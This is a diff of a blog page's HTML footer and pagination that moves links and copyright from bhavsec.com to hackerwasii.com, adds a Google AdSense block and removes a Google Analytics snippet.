           <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="https://bhavsec.com/posts/intro-to-azure-pentesting/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">Introduction to Azure Pentesting ☁️</span>
-                </a>
-              </span>
-            
-            
-              <span class="button next">
-                <a href="https://bhavsec.com/posts/shellshock/">
-                  <span class="button__text">Bash and the Shellshock ⚡️</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
+            <span class="button previous">
+              <a href="https://www.hackerwasii.com/posts/intro-to-azure-pentesting/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Introduction to Azure Pentesting ☁️</span>
+              </a>
+            </span>
+            <span class="button next">
+              <a href="https://www.hackerwasii.com/posts/shellshock/">
+                <span class="button__text">Bash and the Shellshock ⚡️</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
           </div>
         </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </div>
-
       </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      
-      <div class="copyright">
-        <span> 
-          © 2018-2022
-        </span>
-      </div>
-      <div>
-        <span>    
-        <span>
-        <a href="../../archive">archive</a>
-        &nbsp; 
-        </span>
-          <a href="../../newsletter">newsletter</a>
-        </span>   
-        &nbsp;      
-        <span>
-          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
-        </span>
-        &nbsp;      
-        <span>
-          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
-        </span>
-
-      </div>
-
-    
-  </div>
-</footer>
-
-<script src="../../assets/main.js"></script>
-<script src="../../assets/prism.js"></script>
-
-      
     </div>
+    <footer class="footer">
+      <div class="footer__inner">
+        <div class="copyright">
+          <span>
+            © 2020-2022 Waseem Akram
+          </span>
+        </div>
+        <div>
+          <span>
+            <span>
+              <a href="../../archive">archive</a>
+              &nbsp;
+            </span>
+            <a href="../../newsletter">newsletter</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="http://www.hackerwasii.com/posts/index.xml" target=”_blank”>rss feed</a>
+          </span>
+        </div>
+      </div>
+    </footer>
+    <!-- hackerwasii -->
+    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9670252621494000" data-ad-slot="1081579313"
+      data-ad-format="auto" data-full-width-responsive="true"></ins>
+    <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+    <script src="../../assets/main.js"></script>
+    <script src="../../assets/prism.js"></script>
+  </div>
+</body>
 
-    
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
-}
-</script>
-
-    
-  </body>
 </html>
